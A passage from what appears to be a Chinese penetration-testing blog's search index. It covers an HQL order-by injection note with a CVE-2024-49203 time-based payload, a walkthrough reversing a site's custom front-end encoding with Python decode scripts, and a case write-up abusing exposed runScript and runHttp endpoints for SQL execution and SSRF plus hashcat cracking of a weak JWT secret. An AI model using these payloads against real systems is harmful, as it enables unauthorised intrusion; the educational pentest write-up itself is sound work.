","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:6:2","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"æ¡ˆä¾‹2-orderby ORM HQL Injection /view?sort=createdAt,date # æ­£å¸¸ /view?sort=createdAt,() # hql æŠ¥é”™ # Order byä½ç½®ï¼Œæ³¨å…¥ç‚¹åœ¨è”åˆæŸ¥è¯¢çš„ä¸­é—´ï¼Œéœ€è¦å¹³è¡¡ /view?sort=createdAt,FUNCTION(CURRENT_INSTANT) CVE-2024-49203: Querydsl HQL orderbyæ³¨å…¥ # poc: https://github.com/CSIRTTrizna/CVE-2024-49203/ orderBy=name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:7:0","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["Pentest"],"content":"å‚è€ƒèµ„æ–™ Hibernateå®˜æ–¹æ–‡æ¡£ HQLæ–‡æ¡£ Hibernate â€“ Query Language HQLæ³¨å…¥æ·±å…¥åˆ©ç”¨ HQL for pentesters https://ultramangaia.github.io/blog/2017/pwn2win-ctf-2017.html ","date":"2025-03-12","objectID":"/posts/hibernate_hql_injection/:8:0","tags":["SQLi","Java"],"title":"Hibernateæ¡†æ¶HQLæ³¨å…¥ç¬”è®°","uri":"/posts/hibernate_hql_injection/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"è®°ä¸€æ¬¡æ¸—é€æµ‹è¯•ä¸­ç®€å•çš„å‰ç«¯åŠ å¯†æ¡ˆä¾‹","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/","tags":["Pentest","Crypto"],"title":"002-æ¸—é€æ¡ˆä¾‹ï¼šè®°ä¸€æ¬¡ç®€å•å‰ç«¯åŠ å¯†æ¡ˆä¾‹","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"å‰ç«¯JSåˆ†æ åœ¨ä¸€ä¸ªé¡¹ç›®ä¸Šé‡åˆ°çš„æ•°æ®åŒ…åŠ å¯†ï¼Œå‘ç°é”®å€¼å¯¹éƒ½è¿›è¡Œäº†åŠ å¯†ä½¿å…¶ä¸å¯è¯»ï¼Œæ•°æ®åŒ…ç¤ºä¾‹å¦‚ä¸‹ï¼š POST /xxxxx/xxxxx HTTP/1.1 Host: xxxxxxxx %3DmQWUVmw6XZNckRdd5%3DWeEc=%3DlwrRUGR0T1PR1hNVR%3DTeEc\u0026%3D0wKWmltrGtbWFJdZh%3DYeEc=%3Dj3a3lWG9kTUQh0UTNIZMBMVeEc\u00263Vl95TkPVEoWeEc=%3D1Qsm0mywTTa6FUxJk0rwkFEPmGO61EpK0dTaJ5Vbl1WR9UMTRdWek5RRB1TN4dacR%3DTeEc\u0026%3DEQsG1VRST1PYpNdQh%3DZeEc=UVT9CVRPTEFVeEc é€šè¿‡å‰ç«¯jsåˆ†æåï¼Œå‘ç°ä½¿ç”¨çš„æ˜¯ picList.encode(picList.encode2(param)) ä»”ç»†ç ”ç©¶åå‘ç°ï¼Œå®ƒè·Ÿ picList å…¶å®å…³ç³»ä¸å¤§ï¼Œæ˜¯å¼€å‘è€…è‡ªå·±ç¼–å†™çš„ä¸€æ®µjs å¯¹è¯¥å‰ç«¯ä»£ç è¿›è¡Œåˆ†æï¼Œæ ¸å¿ƒä»£ç  jquery.picList.js å¦‚ä¸‹ï¼š var picList = { base64EncodeChars: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', base64DecodeChars: new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1), base64encode: function (r) { for (var e, a, t, o = r.length, h = 0, c = ''; h \u003c o;) { if (e = 255 \u0026 r.charCodeAt(h++), h == o) { c = (c += this.base64EncodeChars.charAt(e \u003e\u003e 2)) + this.base64EncodeChars.charAt((3 \u0026 e) \u003c\u003c 4) + '=='; break; } if (a = r.charCodeAt(h++), h == o) { c = (c = (c += this.base64EncodeChars.charAt(e \u003e\u003e 2)) + this.base64EncodeChars.charAt((3 \u0026 e) \u003c\u003c 4 | (240 \u0026 a) \u003e\u003e 4)) + this.base64EncodeChars.charAt((15 \u0026 a) \u003c\u003c 2) + '='; break; } t = r.charCodeAt(h++), c = (c = (c = (c += this.base64EncodeChars.charAt(e \u003e\u003e 2)) + this.base64EncodeChars.charAt((3 \u0026 e) \u003c\u003c 4 | (240 \u0026 a) \u003e\u003e 4)) + this.base64EncodeChars.charAt((15 \u0026 a) \u003c\u003c 2 | (192 \u0026 t) \u003e\u003e 6)) + this.base64EncodeChars.charAt(63 \u0026 t); } return c; }, base64decode: function (r) { for (var e, a, t, o, h = r.length, c = 0, s = ''; c \u003c h;) { for (; e = this.base64DecodeChars[255 \u0026 r.charCodeAt(c++)], c \u003c h \u0026\u0026 -1 == e;); if (-1 == e) break; for (; a = this.base64DecodeChars[255 \u0026 r.charCodeAt(c++)], c \u003c h \u0026\u0026 -1 == a;); if (-1 == a) break; s += String.fromCharCode(e \u003c\u003c 2 | (48 \u0026 a) \u003e\u003e 4); do { if (61 == (t = 255 \u0026 r.charCodeAt(c++))) return s; } while (t = this.base64DecodeChars[t], c \u003c h \u0026\u0026 -1 == t); if (-1 == t) break; s += String.fromCharCode((15 \u0026 a) \u003c\u003c 4 | (60 \u0026 t) \u003e\u003e 2); do { if (61 == (o = 255 \u0026 r.charCodeAt(c++))) return s; } while (o = this.base64DecodeChars[o], c \u003c h \u0026\u0026 -1 == o); if (-1 == o) break; s += String.fromCharCode((3 \u0026 t) \u003c\u003c 6 | o); } return s; }, utf16to8: function (r) { for (var e, a = '', t = r.length, o = 0; o \u003c t; o++) 1 \u003c= (e = r.charCodeAt(o)) \u0026\u0026 e \u003c= 127 ? a += r.charAt(o) : a = 2047 \u003c e ? (a = (a += String.fromCharCode(224 | e \u003e\u003e 12 \u0026 15)) + String.fromCharCode(128 | e \u003e\u003e 6 \u0026 63)) + String.fromCharCode(128 | e \u003e\u003e 0 \u0026 63) : (a += String.fromCharCode(192 | e \u003e\u003e 6 \u0026 31)) + String.fromCharCode(128 | e \u003e\u003e 0 \u0026 63); return a; }, utf8to16: function (r) { for (var e, a, t, o = '', h = r.length, c = 0; c \u003c h;) switch ((e = r.charCodeAt(c++)) \u003e\u003e 4) { case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7: o += r.charAt(c - 1); break; case 12: case 13: a = r.charCodeAt(c++), o += String.fromCharCode((31 \u0026 e) \u003c\u003c 6 | 63 \u0026 a); break; case 14: a = r.charCodeAt(c++), t = r.charCodeAt(c++), o += String.fromCharCode((15 \u0026 e) \u003c\u003c 12 | (63 \u0026 a) \u003c\u003c 6 | (63 \u0026 t) \u003c\u003c 0); } return o; }, randomStr: function (r) { for (var e = 'poiuytrewqasdfghjklmnbvcxzQWERTYUIOPLKJHGFDSAZXCVBNM123456789', a = '', t = 0; t \u003c r; t++) a += e.charAt(Math.ceil(100000000 * Math.random()) % e.length); return a; }, encode: function (r) { $.ECOND.picture \u0026\u0026 $.ECOND.picture, r += this.randomStr(5); for (var e, a = (str = picList.base64encode(picList.utf16to8(r))).split(''), t = 0; t \u003c Math.floor(a.length / 2); t++) t % 2 == 0 \u0026\u0026 (e = a[t], a[t] = a[a.length - 1 - t], a[a.length - 1 - t] = e); return $.ECOND.picture \u0026\u0026 '' != $.ECOND.picture ? a.join('') + 'cEe' : a.join('') + 'eEc'; }, encode2: fu","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/:1:0","tags":["Pentest","Crypto"],"title":"002-æ¸—é€æ¡ˆä¾‹ï¼šè®°ä¸€æ¬¡ç®€å•å‰ç«¯åŠ å¯†æ¡ˆä¾‹","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"Pythonè„šæœ¬ åˆ†æå®Œè¿™ä¸ªJSåï¼ŒåŸºäºAIç”Ÿæˆç¼–å†™PythonåŠ è§£å¯†è„šæœ¬ import base64 import random import string from urllib.parse import quote, unquote def randomStr(length): letters = string.ascii_letters return ''.join(random.choice(letters) for i in range(length)) def utf16to8(s): return s.encode('utf-8') def utf8to16(s): return s.decode('utf-8') def base64encode(s): return base64.b64encode(s).decode('utf-8') def base64decode(s): return base64.b64decode(s) ECOND = { 'picture': None } def encode(r): # ç»™å­—ç¬¦ä¸² r åé¢æ‹¼æ¥éšæœº5ä½å­—ç¬¦ä¸² r = r + randomStr(5) # å…ˆå°† r è½¬æ¢ä¸º UTF - 8 ç¼–ç ï¼Œå†è¿›è¡Œ Base64 ç¼–ç  encoded_str = base64encode(utf16to8(r)) a = list(encoded_str) # å¯¹ç¼–ç åçš„å­—ç¬¦ä¸²æŒ‰å­—ç¬¦æ‹†åˆ†æˆæ•°ç»„ï¼Œç„¶åå¯¹æ•°ç»„çš„å‰åŠéƒ¨åˆ†å…ƒç´ è¿›è¡Œäº¤æ¢æ“ä½œ for t in range(len(a) // 2): if t % 2 == 0: # å¦‚æœå½“å‰ç´¢å¼• t æ˜¯å¶æ•°ï¼Œäº¤æ¢æ•°ç»„ä¸­ç´¢å¼•ä¸º t å’Œ len(a) - 1 - t çš„å…ƒç´  a[t], a[len(a) - 1 - t] = a[len(a) - 1 - t], a[t] # æ ¹æ® ECOND['picture'] çš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥å­˜åœ¨ä¸”ä¸ä¸ºç©ºï¼Œåˆ™æ‹¼æ¥ä¸Š \"cEe\"ï¼Œå¦åˆ™æ‹¼æ¥ä¸Š \"eEc\" result = ''.join(a) if ECOND.get('picture'): return result + \"cEe\" else: return result + \"eEc\" def decode(r): # ç§»é™¤æ‹¼æ¥çš„åç¼€ \"cEe\" æˆ– \"eEc\" if r.endswith(\"cEe\"): r = r[:-3] elif r.endswith(\"eEc\"): r = r[:-3] a = list(r) # é€†å‘äº¤æ¢æ•°ç»„å‰åŠéƒ¨åˆ†ä¸­ç´¢å¼•ä¸ºå¶æ•°çš„å…ƒç´  for t in range(len(a) // 2): if t % 2 == 0: a[t], a[len(a) - 1 - t] = a[len(a) - 1 - t], a[t] # å°†æ•°ç»„å…ƒç´ æ‹¼æ¥æˆå­—ç¬¦ä¸²å¹¶è¿›è¡Œ Base64 è§£ç  decoded_str = base64decode(''.join(a)) # å°† UTF - 8 ç¼–ç çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º UTF - 16 ç¼–ç  decoded_str = utf8to16(decoded_str) # ç§»é™¤æ‹¼æ¥çš„é•¿åº¦ä¸º 5 çš„éšæœºå­—ç¬¦ä¸² decoded_str = decoded_str[:-5] return decoded_str def main(): # å®šä¹‰ä¸€ä¸ªè¾“å…¥å­—ç¬¦ä¸² encoded_input = \"hUWWL2VH9Tkiz0pMWNEOPJlcZdtYeEc\" encoded_input = unquote(encoded_input) plain_input = 'helloworld' # è°ƒç”¨ encode å‡½æ•°è¿›è¡Œç¼–ç  encoded_output = quote(encode(base64encode(plain_input.encode('utf-8')))) # è°ƒç”¨ decode å‡½æ•°è¿›è¡Œè§£ç  decoded_output = base64decode(decode(encoded_input)).decode('utf-8') # æ‰“å°ç»“æœ print(f\"è¾“å…¥æ˜æ–‡å­—ç¬¦ä¸²: \\n{plain_input}\") print(f\"ç¼–ç åçš„ç»“æœ: \\n{encoded_output}\") print(f\"\") print(f\"è¾“å…¥ç¼–ç å­—ç¬¦ä¸²: \\n{encoded_input}\") print(f\"è§£ç åçš„ç»“æœ: \\n{decoded_output}\") if __name__ == \"__main__\": main() ","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/:2:0","tags":["Pentest","Crypto"],"title":"002-æ¸—é€æ¡ˆä¾‹ï¼šè®°ä¸€æ¬¡ç®€å•å‰ç«¯åŠ å¯†æ¡ˆä¾‹","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"AutoDecodeè„šæœ¬ åœ¨è¯¥é¡¹ç›®ä¸Šæˆ‘ä½¿ç”¨Burpsuite é…åˆæ’ä»¶AutoDecodeè¿›è¡Œæµ‹è¯•ï¼Œå› æ­¤éœ€è¦ç¼–å†™AutoDecodeç›¸åº”çš„åŠ å¯†ç§˜è„šæœ¬ã€‚ æ³¨æ„è¯¥è„šæœ¬æœªå®ç° encode åŠ å¯†æ¨¡å—ï¼Œdecodeæ¨¡å—å¯ç”¨ # -*- coding:utf-8 -*- # author: Xavier from flask import Flask,Response,request,jsonify from pyDes import * from urllib.parse import parse_qs, quote, unquote import base64 import chardet import random import string app = Flask(__name__) def randomStr(length): letters = string.ascii_letters return ''.join(random.choice(letters) for i in range(length)) def utf16to8(s): return s.encode('utf-8') def utf8to16(s): return s.decode('utf-8') def base64encode(s): return base64.b64encode(s).decode('utf-8') def base64decode(s): return base64.b64decode(s) # æ¨¡æ‹Ÿ $.ECOND.picture ECOND = { 'picture': None } def encode(r): r = r + randomStr(5) encoded_str = base64encode(utf16to8(r)) a = list(encoded_str) for t in range(len(a) // 2): if t % 2 == 0: # å¦‚æœå½“å‰ç´¢å¼• t æ˜¯å¶æ•°ï¼Œäº¤æ¢æ•°ç»„ä¸­ç´¢å¼•ä¸º t å’Œ len(a) - 1 - t çš„å…ƒç´  a[t], a[len(a) - 1 - t] = a[len(a) - 1 - t], a[t] result = ''.join(a) if ECOND.get('picture'): return result + \"cEe\" else: return result + \"eEc\" def decode(r): # ç§»é™¤æ‹¼æ¥çš„åç¼€ \"cEe\" æˆ– \"eEc\" if r.endswith(\"cEe\"): r = r[:-3] elif r.endswith(\"eEc\"): r = r[:-3] a = list(r) # é€†å‘äº¤æ¢æ•°ç»„å‰åŠéƒ¨åˆ†ä¸­ç´¢å¼•ä¸ºå¶æ•°çš„å…ƒç´  for t in range(len(a) // 2): if t % 2 == 0: a[t], a[len(a) - 1 - t] = a[len(a) - 1 - t], a[t] decoded_str = base64decode(''.join(a)) decoded_str = utf8to16(decoded_str) decoded_str = decoded_str[:-5] # ç§»é™¤éšæœºå­—ç¬¦ä¸² return decoded_str @app.route('/encode',methods=[\"POST\"]) def encrypt(): â€¦â€¦ encry_param += '' return encry_param @app.route('/decode',methods=[\"POST\"]) def decrypt(): form_data = request.form.get('dataBody') # ä½¿ç”¨ parse_qs å‡½æ•°è§£æè¡¨å•æ•°æ® params_dict = parse_qs(form_data) decrypt_param = '' # æ‰“å°æå–çš„é”®å€¼å¯¹ for key, values in params_dict.items(): for value in values: print(f\"Key: {key}, Value: {value}\") # è§£å¯†å‚æ•° key = base64decode(decode(key)).decode('utf-8') value = base64decode(decode(value)).decode('utf-8') print(f\"Decoded Key: {key}, Decoded Value: {value}\") decrypt_param += key + '=' + value + '\u0026' decrypt_param += '' return decrypt_param if __name__ == '__main__': app.debug = True # è®¾ç½®è°ƒè¯•æ¨¡å¼ï¼Œç”Ÿäº§æ¨¡å¼çš„æ—¶å€™è¦å…³æ‰debug app.run(host=\"0.0.0.0\",port=\"8888\") ","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/:3:0","tags":["Pentest","Crypto"],"title":"002-æ¸—é€æ¡ˆä¾‹ï¼šè®°ä¸€æ¬¡ç®€å•å‰ç«¯åŠ å¯†æ¡ˆä¾‹","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"æœ€ç»ˆæ•ˆæœ é…ç½®å®ŒAutoDecodeï¼Œå¯åŠ¨Pythonè„šæœ¬åï¼Œæœ€åå®ç°äº†å¯¹æ•°æ®åŒ…çš„è‡ªåŠ¨åŠ è§£å¯†ï¼Œæ•ˆæœå¦‚ä¸‹æ‰€ç¤ºï¼š è§£å¯†å‰ï¼š è§£å¯†åï¼š ","date":"2025-03-10","objectID":"/posts/002-case_simpleencryptioncase/:4:0","tags":["Pentest","Crypto"],"title":"002-æ¸—é€æ¡ˆä¾‹ï¼šè®°ä¸€æ¬¡ç®€å•å‰ç«¯åŠ å¯†æ¡ˆä¾‹","uri":"/posts/002-case_simpleencryptioncase/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"é€šè¿‡JSåˆ†æå‘ç°æ›´å¤šæ¼æ´","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/","tags":["Pentest"],"title":"001-æ¸—é€æ¡ˆä¾‹ï¼šå·§ç”¨JSæŒ–æ˜â€œå®è—â€","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"å£°æ˜ï¼šæœ¬æ–‡çº¯å±è™šæ„ï¼Œå¦‚æœ‰é›·åŒçº¯å±å·§åˆã€‚ ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:0:0","tags":["Pentest"],"title":"001-æ¸—é€æ¡ˆä¾‹ï¼šå·§ç”¨JSæŒ–æ˜â€œå®è—â€","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"èƒŒæ™¯ ä¸€ä¸ªå¯»å¸¸çš„å·¥ä½œæ—¥ï¼Œå°X æ”¶åˆ°ä»»åŠ¡å¯¹ A é›†å›¢æŸç³»ç»Ÿè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œä½†æ˜¯ä¸èƒ½ç”¨è‡ªå·±ç”µè„‘ï¼Œéœ€è¦è¿œæ§å®¢æˆ·ç”µè„‘è¿›è¡Œæµ‹è¯•ã€‚ï¼ˆå› æ­¤ï¼Œä»¥ä¸‹å†…å®¹é…å›¾éƒ½ä¸æ˜¯åŸå›¾ï¼Œ~~å°½é‡è¿˜åŸï¼Œ~~éƒ½æ˜¯è™šæ„çš„ï¼‰ è¿ä¸Šå®¢æˆ·ç”µè„‘ï¼Œç®€å•çœ‹äº†ä¸‹ç¯å¢ƒï¼Œè¿˜è¡Œï¼Œè¿˜æ˜¯æœ‰Burpsuiteçš„ï¼Œä¸ç®—å¤©å´©å¼€å±€ã€‚BPä¸€å¼€ï¼ŒLink startï¼æœç„¶ä¸€ä¸ªæ ‡å‡†ç™»å½•æ¡†ï¼šè´¦æˆ·ã€å¯†ç ã€å›¾å½¢éªŒè¯ç ã€‚ ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:1:0","tags":["Pentest"],"title":"001-æ¸—é€æ¡ˆä¾‹ï¼šå·§ç”¨JSæŒ–æ˜â€œå®è—â€","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"1 - ç¢°å£ å¸¸è§„æ€è·¯æ˜¯å¯¹ç³»ç»Ÿè¿›è¡Œè·¯å¾„æ‰«æï¼Œå®¢æˆ·ç”µè„‘ä¸Šæ²¡æœ‰å·¥å…·ï¼Œå°±ç”¨ Burp è‡ªå¸¦çš„å­—å…¸æ‰«æä¸€ä¸‹ï¼Œæ²¡ä»€ä¹ˆå‘ç°ã€‚ åŒæ—¶å¯¹ç™»å½•æ¡†è¿›è¡Œå¸¸è§„æµ‹è¯•ï¼šå¼±å£ä»¤ã€ç”¨æˆ·åå¯†ç æšä¸¾ã€éªŒè¯ç ç¼ºé™·ç­‰ï¼Œæœªå¤ä¹ æ¼æ´ã€‚ ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:2:0","tags":["Pentest"],"title":"001-æ¸—é€æ¡ˆä¾‹ï¼šå·§ç”¨JSæŒ–æ˜â€œå®è—â€","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"2 - JSçš„æ•‘èµ æ¥ä¸‹å»å¯¹ç³»ç»Ÿå‰ç«¯ç•Œé¢è¿›è¡Œåˆ†æï¼Œé€šè¿‡æŠ“åŒ…åˆ†æå¾ˆç¥å¥‡çš„äº‹æƒ…ï¼Œè¿™ä¸ªç½‘ç«™æ²¡æœ‰æ˜ç¡®çš„.jså’Œ.cssç»“å°¾çš„æ–‡ä»¶ï¼Œæ€ä¹ˆä¼šå‘¢ï¼Œä¸ç§‘å­¦ã€‚ åˆ†ææ•°æ®åŒ…å‘ç°å½“è®¿é—®ç³»ç»ŸåŸŸåæ—¶ï¼Œä¼šè‡ªåŠ¨é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼Œä½†æ˜¯è¿™ä¸ªè¿‡ç¨‹ä¸­æœ‰ä¸ªé“¾æ¥æ˜¯è¿™æ ·çš„ /include.html?page=/path/login.jsp\u0026type=css\u0026xxx\u0026files=index.css;.../static/xxxx.css; /include.html?page=/path/login.jsp\u0026type=js\u0026xxx\u0026files=index.js;.../static/xxxx.js; å¯¹è¿™ä¸ªé“¾æ¥è¿›è¡Œåˆ†æï¼Œåˆ†æç›¸åº”åŠŸèƒ½ç½‘é¡µçš„JSå’ŒCSSæ–‡ä»¶éƒ½æ˜¯é€šè¿‡include.htmlè¿›è¡Œç»Ÿä¸€åŠ è½½ã€‚ é‚£ä¹ˆè¿™ä¹ˆä¸€ä¸ªé“¾æ¥ï¼Œæœ‰å“ªäº›å¯èƒ½çš„æ¼æ´å‘¢ï¼Ÿ æˆ‘åœ¨è¿™å—æµ‹è¯•äº†æ–‡ä»¶è¯»å–ã€SSRFç­‰ï¼Œæœªå‘ç°æœ‰æ•ˆæ¼æ´ã€‚ é€šè¿‡ä¸Šè¿°é“¾æ¥ï¼Œå½“ type=js æ—¶ï¼Œä¼šåŠ è½½é»˜è®¤çš„JSæ–‡ä»¶ï¼Œå†åŠ ä¸Šæ‰€æŒ‡å®šJSæ–‡ä»¶ï¼Œå¯¹è¯¥JSè¿›è¡Œåˆ†æï¼Œç»ˆäºæœ‰æ‰€æ”¶è·äº†ã€‚ å¯¹JSæ–‡ä»¶è¿›è¡Œæ‰«æï¼Œå‘ç°äº†å¾ˆå¤šæ¥å£ è™½ç„¶æœ‰äº›æ¥å£è®¿é—®æ˜¯404ï¼Œä½†è¿˜æ˜¯æœ‰å¾ˆå¤šæ¥å£å­˜åœ¨ï¼Œä¸è¿‡ä¸‹é¢è¿™äº›æ¥å£è®¿é—®401ï¼Œæ— æ³•åˆ©ç”¨ã€‚ /common/linkeditor.jsp?parentPage=pagedesigner\u0026url= /admin/upload.htm /admin/deleteTempFile.htm?fileName= ä½†æ˜¯ä¹ŸæˆåŠŸæ‰¾åˆ°äº†ä¸€äº›èƒ½å¤Ÿè®¿é—®çš„æ¥å£ï¼Œå¦‚ä¸‹ï¼š /runSafeScript.htm?sqlId= /runScript.htm /runStoredProcedure.htm /runJavaMethod.htm /runPython.htm /runHttp.htm å¯¹ç›¸åº”æ¥å£çš„JSä»£ç è¿›è¡Œåˆ†æï¼ŒæˆåŠŸæ„é€ äº†runScript å’Œ runHttp çš„è¯·æ±‚åŒ…ï¼Œå¹¶åˆ©ç”¨æˆåŠŸã€‚ ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:3:0","tags":["Pentest"],"title":"001-æ¸—é€æ¡ˆä¾‹ï¼šå·§ç”¨JSæŒ–æ˜â€œå®è—â€","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"SQLæ‰§è¡Œ function runSQL(e, t) { â€¦â€¦â€¦â€¦ $.ajax({ url: getBasePath() + \"/runScript.htm\", type: \"post\", async: !1, data: { script: encodeBase64Twice(i), dataSource: t || \"current\" }, success: function (e) { a = e; }, }) â€¦â€¦ } æ ¹æ® JS æ„é€ è¯·æ±‚åŒ…ï¼š POST /runScript.htm HTTP/1.1 Host: xxxxxx script={åŒé‡Base64çš„SQLè¯­å¥}\u0026dataSource=current ä½¿ç”¨å»ºè®®SQLè¯­å¥select 1; ï¼Œselect 'a' æ¢æµ‹éƒ½æˆåŠŸäº†ï¼Œä½†æ˜¯ select database()ï¼ŒSELECT banner FROM v$version ç­‰éƒ½æ²¡æ‰§è¡ŒæˆåŠŸã€‚ åœ¨è¿™å—èŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œè¿›è¡Œæ¼«é•¿çš„æ¢æµ‹ï¼Œå¸¸è§çš„SQLè¯­å¥éƒ½æ— æ³•æˆåŠŸæ‰§è¡Œï¼Œç”±äºæ—¶é—´ç´§è¿«ä¸€åº¦æ‰“ç®—æ”¾å¼ƒäº†ã€‚æœ€åæƒ³ç€å†è¯•ä¸€æ¬¡ï¼Œä»å¤´æ•´ç†æ¢æµ‹æ€è·¯åˆ¤æ–­æ•°æ®åº“ï¼Œæœ€ç»ˆç¡®å®šäº†ç³»ç»Ÿçš„æ•°æ®åº“ç±»å‹ä¸º Postgresqlï¼Œè€Œä¸æ˜¯å‰æœŸåˆ¤æ–­çš„ MySQLã€Oracleã€MSSQLã€DMSQLã€‚ SQLè¯­å¥æ‰§è¡ŒæˆåŠŸã€‚ ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:3:1","tags":["Pentest"],"title":"001-æ¸—é€æ¡ˆä¾‹ï¼šå·§ç”¨JSæŒ–æ˜â€œå®è—â€","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"SSRF å†çœ‹å¦ä¸€ä¸ªæ¥å£runHttp.htm çš„ JSä»£ç  function runHttp(e, t, n, r, i) { $.post( getBasePath() + \"/runHttp.htm\", { url: e, method: t, data: n, header: r }, function (e) { i \u0026\u0026 i(e); } ); } æ ¹æ®ä¸Šè¿° JS ä»£ç å¯æ„é€ å¦‚ä¸‹HTTPè¯·æ±‚ POST /runHttp.htm HTTP/1.1 Host: xxxxxxx url=http://xxxxx/statics/xxxx.js\u0026method=get\u0026data=\u0026header= è¿™å—æ²¡ä»€ä¹ˆå¥½å¤šè¯´çš„ï¼Œæ„é€ è¯·æ±‚årunHttp æˆåŠŸï¼Œèƒ½å¤Ÿå®ç°SSRFæ¢æµ‹ï¼Œå‘ç›®æ ‡URLè¿›è¡Œè¯·æ±‚å¹¶è·å–å…¶å“åº”å†…å®¹ã€‚ ","date":"2025-01-09","objectID":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/:3:2","tags":["Pentest"],"title":"001-æ¸—é€æ¡ˆä¾‹ï¼šå·§ç”¨JSæŒ–æ˜â€œå®è—â€","uri":"/posts/001-case_%E5%B7%A7%E7%94%A8js%E6%8C%96%E6%8E%98%E5%AE%9D%E8%97%8F/"},{"categories":["æ¡ˆä¾‹åˆ†äº«"],"content":"3 - è™šæ™ƒçš„ JWT åœ¨JSä¸­é™¤äº†ä¸Šè¿°æ¥å£ä¹‹å¤–ï¼Œè¿˜æ‰¾åˆ°äº†ä¸€æ¡ JWT Tokenæ³„éœ²ã€‚å¯¹äºJWT Token çš„æ³„éœ²ï¼Œç›´æ¥åˆ©ç”¨è‚¯å®šæ˜¯ä¸è¡Œï¼Œä¸€èˆ¬éƒ½æ˜¯è¿‡æœŸäº†çš„ã€‚ è¿™é‡Œå¯¹ JWT çš„ secret Key è¿›è¡Œäº†æšä¸¾ï¼Œè¿˜çœŸæ˜¯æœ‰å¼± secret keyï¼Œé€šè¿‡hashcatè¿›è¡Œæš´ç ´ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š $ hashcat -m 16500 test.jwt.hash ./jwt.secrets.list --force --quiet --show eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYmYiOjE2NzU5MTAwNjcsInVzZXJpZCI6ImZhMTIzMDZlLTEwYmMtNGYyNS1hNWU3LWY2NDIyNWJhMzAyNCIsImV4cCI6MTY3NTk1MDA2NywiaWF0IjoxNjc1OTEwMDY3LCJ1c2VybmFtZSI6Inh4eHhkZW1vMSJ9.xpqoFsaqwBcpYuslV5BvjWpWPH31fExNoDcE-gbryKs:123456 